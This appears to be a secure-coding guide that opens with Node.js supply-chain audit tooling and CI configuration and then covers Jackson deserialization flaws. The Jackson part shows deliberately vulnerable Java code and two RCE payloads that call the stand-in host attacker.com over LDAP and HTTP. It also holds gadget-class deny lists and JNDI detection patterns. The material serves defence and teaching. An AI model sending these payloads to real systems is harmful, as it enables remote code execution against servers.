```javascript
// scripts/dependency-audit.js - Custom audit script
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

class DependencyAuditor {
  constructor(options = {}) {
    this.severityThreshold = options.severityThreshold || 'high';
    this.failOnVulnerability = options.failOnVulnerability ?? true;
    this.reportPath = options.reportPath || './security-reports';
    this.blockedPackages = new Set([
      'event-stream',      // Malicious package incident 2018
      'flatmap-stream',    // Malicious dependency
      'ua-parser-js',      // Compromised versions
      'coa',               // Compromised versions 2021
      'rc'                 // Compromised versions 2021
    ]);
  }

  async runFullAudit() {
    console.log('🔍 Starting comprehensive dependency audit...\n');

    const results = {
      timestamp: new Date().toISOString(),
      npmAudit: null,
      snykResults: null,
      outdatedPackages: null,
      blockedPackagesFound: [],
      lockfileIntegrity: null
    };

    try {
      // Check for blocked/malicious packages
      results.blockedPackagesFound = this.checkBlockedPackages();

      // Verify lockfile integrity
      results.lockfileIntegrity = this.verifyLockfileIntegrity();

      // Run npm audit
      results.npmAudit = this.runNpmAudit();

      // Check for outdated packages
      results.outdatedPackages = this.checkOutdated();

      // Generate report
      this.generateReport(results);

      // Determine exit code
      return this.evaluateResults(results);

    } catch (error) {
      console.error('❌ Audit failed:', error.message);
      process.exit(1);
    }
  }

  checkBlockedPackages() {
    console.log('📦 Checking for known malicious packages...');
    const found = [];

    const lockfilePath = path.join(process.cwd(), 'package-lock.json');
    if (!fs.existsSync(lockfilePath)) {
      console.warn('⚠️  No package-lock.json found');
      return found;
    }

    const lockfile = JSON.parse(fs.readFileSync(lockfilePath, 'utf8'));
    const packages = lockfile.packages || lockfile.dependencies || {};

    for (const [pkgPath, pkgInfo] of Object.entries(packages)) {
      const pkgName = pkgPath.replace('node_modules/', '').split('/')[0];
      if (this.blockedPackages.has(pkgName)) {
        found.push({
          name: pkgName,
          version: pkgInfo.version,
          path: pkgPath,
          reason: 'Known malicious or compromised package'
        });
      }
    }

    if (found.length > 0) {
      console.error(`❌ CRITICAL: Found ${found.length} blocked package(s)!`);
      found.forEach(p => console.error(`   - ${p.name}@${p.version}`));
    } else {
      console.log('✅ No blocked packages found');
    }

    return found;
  }

  verifyLockfileIntegrity() {
    console.log('🔐 Verifying lockfile integrity...');

    try {
      execSync('npm ci --dry-run', { stdio: 'pipe' });
      console.log('✅ Lockfile integrity verified');
      return { valid: true };
    } catch (error) {
      console.error('❌ Lockfile integrity check failed');
      return { valid: false, error: error.message };
    }
  }

  runNpmAudit() {
    console.log('🔍 Running npm audit...');

    try {
      const result = execSync('npm audit --json', { 
        encoding: 'utf8',
        stdio: ['pipe', 'pipe', 'pipe']
      });
      const auditData = JSON.parse(result);

      const summary = auditData.metadata?.vulnerabilities || {};
      console.log(`   Critical: ${summary.critical || 0}`);
      console.log(`   High: ${summary.high || 0}`);
      console.log(`   Moderate: ${summary.moderate || 0}`);
      console.log(`   Low: ${summary.low || 0}`);

      return auditData;
    } catch (error) {
      // npm audit exits with code 1 when vulnerabilities found
      if (error.stdout) {
        return JSON.parse(error.stdout);
      }
      throw error;
    }
  }

  checkOutdated() {
    console.log('📊 Checking for outdated packages...');

    try {
      const result = execSync('npm outdated --json', { 
        encoding: 'utf8',
        stdio: ['pipe', 'pipe', 'pipe']
      });
      return JSON.parse(result || '{}');
    } catch (error) {
      if (error.stdout) {
        return JSON.parse(error.stdout);
      }
      return {};
    }
  }

  generateReport(results) {
    if (!fs.existsSync(this.reportPath)) {
      fs.mkdirSync(this.reportPath, { recursive: true });
    }

    const reportFile = path.join(
      this.reportPath, 
      `audit-${new Date().toISOString().split('T')[0]}.json`
    );

    fs.writeFileSync(reportFile, JSON.stringify(results, null, 2));
    console.log(`\n📄 Report saved to: ${reportFile}`);
  }

  evaluateResults(results) {
    const failures = [];

    // Blocked packages = immediate failure
    if (results.blockedPackagesFound.length > 0) {
      failures.push('Blocked packages detected');
    }

    // Lockfile tampering = immediate failure
    if (!results.lockfileIntegrity?.valid) {
      failures.push('Lockfile integrity check failed');
    }

    // Check vulnerability thresholds
    const vulns = results.npmAudit?.metadata?.vulnerabilities || {};
    if (vulns.critical > 0) {
      failures.push(`${vulns.critical} critical vulnerabilities`);
    }
    if (this.severityThreshold !== 'critical' && vulns.high > 0) {
      failures.push(`${vulns.high} high vulnerabilities`);
    }

    if (failures.length > 0 && this.failOnVulnerability) {
      console.error('\n❌ AUDIT FAILED:');
      failures.forEach(f => console.error(`   - ${f}`));
      return 1;
    }

    console.log('\n✅ Audit passed');
    return 0;
  }
}

// Run audit
const auditor = new DependencyAuditor({
  severityThreshold: process.env.SEVERITY_THRESHOLD || 'high',
  failOnVulnerability: process.env.CI === 'true'
});

auditor.runFullAudit().then(exitCode => {
  process.exit(exitCode);
});
```

```yaml
# .github/workflows/security.yml - CI/CD Integration
name: Security Audit

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    # Run daily at 2 AM UTC
    - cron: '0 2 * * *'
  workflow_dispatch:

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Verify package-lock.json exists
        run: |
          if [ ! -f package-lock.json ]; then
            echo "::error::package-lock.json not found!"
            exit 1
          fi

      - name: Install dependencies (clean install)
        run: npm ci

      - name: Run npm audit
        continue-on-error: true
        run: |
          npm audit --audit-level=high --json > npm-audit.json
          echo "AUDIT_EXIT_CODE=$?" >> $GITHUB_ENV

      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        continue-on-error: true
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high --json-file-output=snyk-report.json

      - name: Check for known malicious packages
        run: |
          node -e "
          const blocked = ['event-stream', 'flatmap-stream', 'ua-parser-js', 'coa', 'rc'];
          const lock = require('./package-lock.json');
          const deps = Object.keys(lock.packages || lock.dependencies || {});
          const found = deps.filter(d => blocked.some(b => d.includes(b)));
          if (found.length) {
            console.error('BLOCKED PACKAGES FOUND:', found);
            process.exit(1);
          }
          console.log('No blocked packages found');
          "

      - name: Upload security reports
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: security-reports
          path: |
            npm-audit.json
            snyk-report.json
          retention-days: 30

      - name: Fail on critical vulnerabilities
        run: |
          CRITICAL=$(cat npm-audit.json | jq '.metadata.vulnerabilities.critical // 0')
          HIGH=$(cat npm-audit.json | jq '.metadata.vulnerabilities.high // 0')

          echo "Critical: $CRITICAL, High: $HIGH"

          if [ "$CRITICAL" -gt 0 ]; then
            echo "::error::$CRITICAL critical vulnerabilities found!"
            exit 1
          fi

          if [ "$HIGH" -gt 5 ]; then
            echo "::error::Too many high vulnerabilities ($HIGH)!"
            exit 1
          fi

  license-compliance:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci

      - name: Check licenses
        run: npx license-checker --onlyAllow 'MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause;ISC;CC0-1.0'
```

**Defense in Depth Layers**:

1. **Pre-commit Hooks (Local Development)**:
```javascript
// .husky/pre-commit
#!/bin/sh
. "$(dirname "$0")/_/husky.sh"

# Quick security check before commit
npm audit --audit-level=critical
if [ $? -ne 0 ]; then
  echo "Critical vulnerabilities found. Fix before committing."
  exit 1
fi
```

2. **Dependabot Configuration**:
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10
    groups:
      security-updates:
        applies-to: security-updates
      production-dependencies:
        dependency-type: "production"
    ignore:
      - dependency-name: "*"
        update-types: ["version-update:semver-major"]
```

3. **Runtime Protection**:
```javascript
// src/security/runtime-protection.js
const { isDeepStrictEqual } = require('util');

// Freeze Object.prototype to prevent runtime pollution
function enablePrototypePollutionProtection() {
  const originalProto = Object.getOwnPropertyDescriptors(Object.prototype);

  // Monitor for prototype pollution attempts
  Object.defineProperty(Object.prototype, '__proto__', {
    get() {
      return Object.getPrototypeOf(this);
    },
    set(value) {
      console.error('SECURITY: Prototype pollution attempt blocked!');
      // Log to security monitoring
      if (global.securityLogger) {
        global.securityLogger.alert({
          type: 'PROTOTYPE_POLLUTION_ATTEMPT',
          timestamp: new Date().toISOString(),
          stack: new Error().stack
        });
      }
      // Don't actually set it
      return false;
    }
  });
}

module.exports = { enablePrototypePollutionProtection };
```

**Additional Protections**:
- **Lock file pinning**: Always commit `package-lock.json` and use `npm ci` in CI/CD for reproducible builds
- **Private registry**: Use Artifactory or npm Enterprise to proxy and scan packages before they enter your environment
- **SBOM generation**: Generate Software Bill of Materials with `npx @cyclonedx/cyclonedx-npm --output-file sbom.json` for supply chain transparency
- **Signed commits**: Require GPG-signed commits for dependency updates to prevent unauthorized changes
- **Branch protection**: Require security checks to pass before merging any PR that modifies dependencies

Jackson deserialization can be extremely dangerous if not configured properly, especially when using polymorphic type handling or outdated versions. The FasterXML Jackson library has had numerous critical CVEs (CVE-2019-12384, CVE-2020-35490, CVE-2020-35491) that allow remote code execution through carefully crafted JSON payloads.

**VULNERABLE CODE**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class UserController {

    // DANGEROUS: Default typing enabled globally
    private static final ObjectMapper mapper = new ObjectMapper();

    static {
        // VULNERABLE: Enables polymorphic deserialization for all types
        mapper.enableDefaultTyping();
    }

    public void processUserData(HttpServletRequest request, 
                                 HttpServletResponse response) throws IOException {
        String jsonData = request.getReader().lines()
            .reduce("", (acc, line) -> acc + line);

        // VULNERABLE: Deserializing untrusted input with default typing
        Object userData = mapper.readValue(jsonData, Object.class);

        // Process the user data
        System.out.println("Received: " + userData);
    }
}
```

**Attack Payload**:
```json
[
  "com.sun.rowset.JdbcRowSetImpl",
  {
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
  }
]
```

**Alternative RCE Payload (CVE-2019-12384)**:
```json
[
  "ch.qos.logback.core.db.DriverManagerConnectionSource",
  {
    "url": "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'"
  }
]
```

**Why This Is Dangerous**:
- `enableDefaultTyping()` allows attackers to specify arbitrary classes to instantiate
- Jackson will deserialize any class on the classpath that has a default constructor
- Gadget classes like JdbcRowSetImpl can trigger JNDI injection leading to RCE
- Outdated Jackson versions (pre-2.10) have known exploitable gadget chains
- Attack requires only HTTP access to endpoints accepting JSON

**SECURE VERSION**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.DeserializationFeature;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureUserController {

    private static final Logger logger = LoggerFactory.getLogger(SecureUserController.class);
    private static final ObjectMapper mapper = createSecureMapper();
    private static final int MAX_JSON_SIZE = 1024 * 1024; // 1MB limit

    private static ObjectMapper createSecureMapper() {
        ObjectMapper om = new ObjectMapper();

        // SECURE: Disable default typing entirely
        // If polymorphic types are needed, use explicit allowlist
        BasicPolymorphicTypeValidator validator = BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(UserData.class)
            .allowIfSubType("com.myapp.dto.")
            .build();

        // SECURE: Only activate if absolutely necessary, with strict allowlist
        // om.activateDefaultTyping(validator, ObjectMapper.DefaultTyping.NON_FINAL);

        // SECURE: Fail on unknown properties
        om.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);

        return om;
    }

    public void processUserData(HttpServletRequest request,
                                 HttpServletResponse response) throws IOException {
        // Input size validation
        if (request.getContentLength() > MAX_JSON_SIZE) {
            logger.warn("Rejected oversized JSON from IP: {}", request.getRemoteAddr());
            response.sendError(413, "Payload too large");
            return;
        }

        String jsonData = request.getReader().lines()
            .reduce("", (acc, line) -> acc + line);

        try {
            // SECURE: Deserialize to specific, known type only
            UserData userData = mapper.readValue(jsonData, UserData.class);

            logger.info("Processed user data for: {}", userData.getUsername());
            // Process the validated user data
        } catch (Exception e) {
            logger.error("Deserialization failed from IP: {}", request.getRemoteAddr(), e);
            response.sendError(400, "Invalid request format");
        }
    }
}

// Explicit DTO class - no polymorphic types
public class UserData {
    private String username;
    private String email;
    private int age;

    // Getters and setters with validation
    public String getUsername() { return username; }
    public void setUsername(String username) {
        if (username != null && username.matches("^[a-zA-Z0-9_]{3,50}$")) {
            this.username = username;
        } else {
            throw new IllegalArgumentException("Invalid username format");
        }
    }
    // Additional getters/setters...
}
```

**Key Security Controls**:
- **No default typing**: Never enable `enableDefaultTyping()` without strict allowlisting
- **Explicit type binding**: Always deserialize to specific DTO classes, never to `Object.class`
- **Input validation**: Limit payload size and validate all fields after deserialization
- **Updated dependencies**: Use Jackson 2.13+ which has improved security defaults
- **Audit logging**: Log all deserialization failures with source IP for incident response

Polymorphic deserialization can be done safely with strict controls, but requires careful implementation and ongoing maintenance. Here's a production-ready approach that balances functionality with security.

**PRODUCTION PATTERN**:

```java
import com.fasterxml.jackson.annotation.JsonSubTypes;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.MapperFeature;
import com.fasterxml.jackson.core.JsonProcessingException;
import org.springframework.stereotype.Service;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Counter;

import javax.annotation.PostConstruct;
import java.util.Set;
import java.util.HashSet;

@Service
public class SecureDeserializationService {

    private static final Logger logger = LoggerFactory.getLogger(SecureDeserializationService.class);
    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    private final ObjectMapper secureMapper;
    private final MeterRegistry meterRegistry;
    private Counter deserializationFailures;
    private Counter suspiciousPayloads;

    // Explicit allowlist of permitted polymorphic base types
    private static final Set<String> ALLOWED_PACKAGE_PREFIXES = Set.of(
        "com.mycompany.domain.",
        "com.mycompany.dto.",
        "com.mycompany.events."
    );

    // Known dangerous classes to block even if they slip through
    private static final Set<String> BLOCKED_CLASSES = Set.of(
        "com.sun.rowset.JdbcRowSetImpl",
        "org.apache.xalan.xsltc.trax.TemplatesImpl",
        "org.springframework.beans.factory.config.PropertyPathFactoryBean",
        "ch.qos.logback.core.db.DriverManagerConnectionSource",
        "com.zaxxer.hikari.HikariDataSource",
        "org.apache.commons.configuration.JNDIConfiguration",
        "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    );

    public SecureDeserializationService(MeterRegistry meterRegistry) {
        this.meterRegistry = meterRegistry;
        this.secureMapper = createSecureObjectMapper();
    }

    @PostConstruct
    public void initMetrics() {
        this.deserializationFailures = meterRegistry.counter("security.deserialization.failures");
        this.suspiciousPayloads = meterRegistry.counter("security.deserialization.suspicious");
    }

    private ObjectMapper createSecureObjectMapper() {
        ObjectMapper mapper = new ObjectMapper();

        // Layer 1: Strict polymorphic type validator
        BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(BaseEvent.class)
            .allowIfSubTypeIsArray()
            .allowIfSubType(clazz -> {
                String className = clazz.getName();
                // Block known dangerous classes
                if (BLOCKED_CLASSES.contains(className)) {
                    securityLogger.error("BLOCKED dangerous class: {}", className);
                    suspiciousPayloads.increment();
                    return false;
                }
                // Only allow our packages
                return ALLOWED_PACKAGE_PREFIXES.stream()
                    .anyMatch(className::startsWith);
            })
            .build();

        // Layer 2: Activate with validator (NON_FINAL is safer than OBJECT_AND_NON_CONCRETE)
        mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);

        // Layer 3: Additional hardening options
        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
        mapper.configure(MapperFeature.BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES, true);
        mapper.configure(DeserializationFeature.FAIL_ON_READING_DUP_TREE_KEY, true);

        return mapper;
    }

    public <T> T deserialize(String json, Class<T> targetType, String sourceIdentifier) {
        // Pre-deserialization security checks
        if (!preDeserializationCheck(json, sourceIdentifier)) {
            throw new SecurityException("Payload failed security validation");
        }

        try {
            T result = secureMapper.readValue(json, targetType);

            // Post-deserialization validation
            validateDeserializedObject(result);

            logger.debug("Successfully deserialized {} from source: {}", 
                targetType.getSimpleName(), sourceIdentifier);
            return result;

        } catch (JsonProcessingException e) {
            deserializationFailures.increment();
            securityLogger.warn("Deserialization failed for source: {} - {}", 
                sourceIdentifier, e.getMessage());
            throw new IllegalArgumentException("Invalid JSON format", e);
        }
    }

    private boolean preDeserializationCheck(String json, String source) {
        // Check for common attack patterns in raw JSON
        String[] dangerousPatterns = {
            "@class",  // Jackson type indicator
            "com.sun.",
            "javax.naming",
            "java.lang.Runtime",
            "java.lang.ProcessBuilder",
            "org.apache.xalan",
            "ch.qos.logback",
            "org.springframework.beans.factory",
            "ldap://",
            "rmi://",
            "jndi:"
        };

        String lowerJson = json.toLowerCase();
        for (String pattern : dangerousPatterns) {
            if (lowerJson.contains(pattern.toLowerCase())) {
                securityLogger.error(
                    "ATTACK_DETECTED: Suspicious pattern '{}' in payload from source: {}",
                    pattern, source);
                suspiciousPayloads.increment();

                // Alert security team
                triggerSecurityAlert(source, pattern, json);
                return false;
            }
        }
        return true;
    }

    private void validateDeserializedObject(Object obj) {
        if (obj == null) return;

        // Verify the deserialized object is from allowed packages
        String className = obj.getClass().getName();
        boolean allowed = ALLOWED_PACKAGE_PREFIXES.stream()
            .anyMatch(className::startsWith);

        if (!allowed) {
            securityLogger.error("SECURITY_VIOLATION: Unexpected class deserialized: {}", className);
            throw new SecurityException("Unauthorized object type");
        }
    }

    private void triggerSecurityAlert(String source, String pattern, String payload) {
        // Integration with SIEM/alerting system
        // This would typically send to Splunk, Datadog, PagerDuty, etc.
        logger.error("SECURITY_ALERT: Potential deserialization attack from {} using pattern {}", 
            source, pattern);
    }
}

